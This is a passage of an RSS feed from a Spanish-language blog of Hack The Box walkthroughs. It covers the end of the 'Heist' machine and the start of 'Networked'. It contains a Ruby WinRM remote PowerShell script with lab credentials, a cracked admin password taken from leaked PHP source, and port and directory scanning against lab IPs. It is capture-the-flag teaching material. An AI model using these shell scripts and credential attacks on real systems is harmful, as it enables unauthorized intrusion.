&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span class=&#34;nb&#34;&gt;require&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;winrm&amp;#39;&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;WinRM&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;Connection&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
  &lt;span class=&#34;ss&#34;&gt;endpoint&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;http://10.10.10.149:5985/wsman&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
  &lt;span class=&#34;ss&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;chase&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
  &lt;span class=&#34;ss&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Q4)sJu\Y8qz*A3?d&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;conn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;ss&#34;&gt;:powershell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shell&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;until&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;command&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;exit&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt;
        &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;PS &amp;gt; &amp;#34;&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;command&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;gets&lt;/span&gt;        
        &lt;span class=&#34;n&#34;&gt;output&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;shell&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;run&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stdout&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;stderr&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;
            &lt;span class=&#34;no&#34;&gt;STDOUT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;stdout&lt;/span&gt;
            &lt;span class=&#34;no&#34;&gt;STDERR&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;stderr&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;end&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;end&lt;/span&gt;    
    &lt;span class=&#34;nb&#34;&gt;puts&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Exiting with code &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;#{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;output&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exitcode&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Podemos ejecutar comandos en la maquina y obtenemos nuestra bandera &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/heist/Screenshot%20from%202019-08-27%2016.00.49.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Estando dentro de la maquina buscamos archivos en los cuales pudiesen haber contraseñas, principalmente los archivos que se utilizan en la plataforma/inicio de sesion de la pagina que contiene la maquina. Encontramos que, dentro del archivo &lt;code&gt;login.php&lt;/code&gt; hay una condicion con dos usuarios que pueden logearse: &lt;code&gt;guest y admin&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;login.php&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;session_start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;login&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;login_username&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;login_password&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;login_username&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;admin@support.htb&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;hash&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;sha256&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;login_password&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;91c077fb5bcdd1eacf7268c945bc1d1ce2faf9634cba615337adbf0af4db9040&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
		&lt;span class=&#34;nv&#34;&gt;$_SESSION&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;admin&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;valid&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
		&lt;span class=&#34;nx&#34;&gt;header&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Location: issues.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; 
	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;
		&lt;span class=&#34;nx&#34;&gt;header&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Location: errorpage.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;guest&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;guest&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;true&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
		&lt;span class=&#34;nv&#34;&gt;$_SESSION&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;guest&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;valid&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
		&lt;span class=&#34;nx&#34;&gt;header&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Location: issues.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos la paigna de md5decrypt para verificar si existe esta contraseña dentro de la pagina:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://md5decrypt.net/en/Sha256/#answer&#34;&gt;&lt;strong&gt;md5decrypt&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;admin@support.htb:91c077fb5bcdd1eacf7268c945bc1d1ce2faf9634cba615337adbf0af4db9040
admin@support.htb:4dD!5}x/re8]FBuZ
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/heist/Screenshot%20from%202019-08-27%2016.10.12.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Verificamos mediante samba que el usuario es administrator y, si este tiene permisos.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/heist/Screenshot%20from%202019-08-27%2016.11.41.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Confirmamos que es el usuario y contraseña de administrator, utilizamos nuevamente el script para winrm con las credenciales.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/heist/Screenshot%20from%202019-08-27%2016.14.26.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos una shell y nuestra bandera &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/heist/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/heist/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>windows</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Networked</title>
        <link>https://sckull.github.io/posts/networked/</link>
        <pubDate>Sat, 16 Nov 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 16 Nov 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/networked/</guid>
        <description>Networked es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Networked es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/networked/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th&gt;Networked&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;OS&lt;/td&gt;
&lt;td&gt;Linux&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;20&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;IP&lt;/td&gt;
&lt;td&gt;10.10.10.146&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/8292&#34;&gt;guly&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;masscan--nmap&#34;&gt;MASSCAN &amp;amp; NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp/udp con masscan y nmap.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~/htb/networked# masscan -p1-65535,U:1-65535 10.10.10.146 --rate&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; -e tun0

Starting masscan 1.0.4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-08-27 23:43:29 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 80/tcp on 10.10.10.146                                    
Discovered open port 22/tcp on 10.10.10.146

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.70 scan initiated Tue Aug 27 22:49:04 2019 as: nmap -sC -sV -p80,22 -o nmap.scan 10.10.10.146&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.146
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.087s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 73💿a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.6 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;CentOS&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; PHP/5.4.16&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.6 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;CentOS&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; PHP/5.4.16
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Site doesn&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;t have a title &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;text/html&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;UTF-8&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Tue Aug 27 22:49:14 2019 -- 1 IP address (1 host up) scanned in 10.16 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Visitamos la pagina que se encuentra en el puerto 80 y nos muestra lo siguiente.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/networked/Screenshot%20from%202019-08-27%2021.12.11.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ademas de eso en el codigo fuente nos muestra un comentario relacionado a una galeria.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/networked/Screenshot%20from%202019-08-27%2021.12.57.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;dirbuster&#34;&gt;DIRBUSTER&lt;/h2&gt;
&lt;p&gt;Utilizamos dirbuster para busqueda de direcotrios y paginas.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
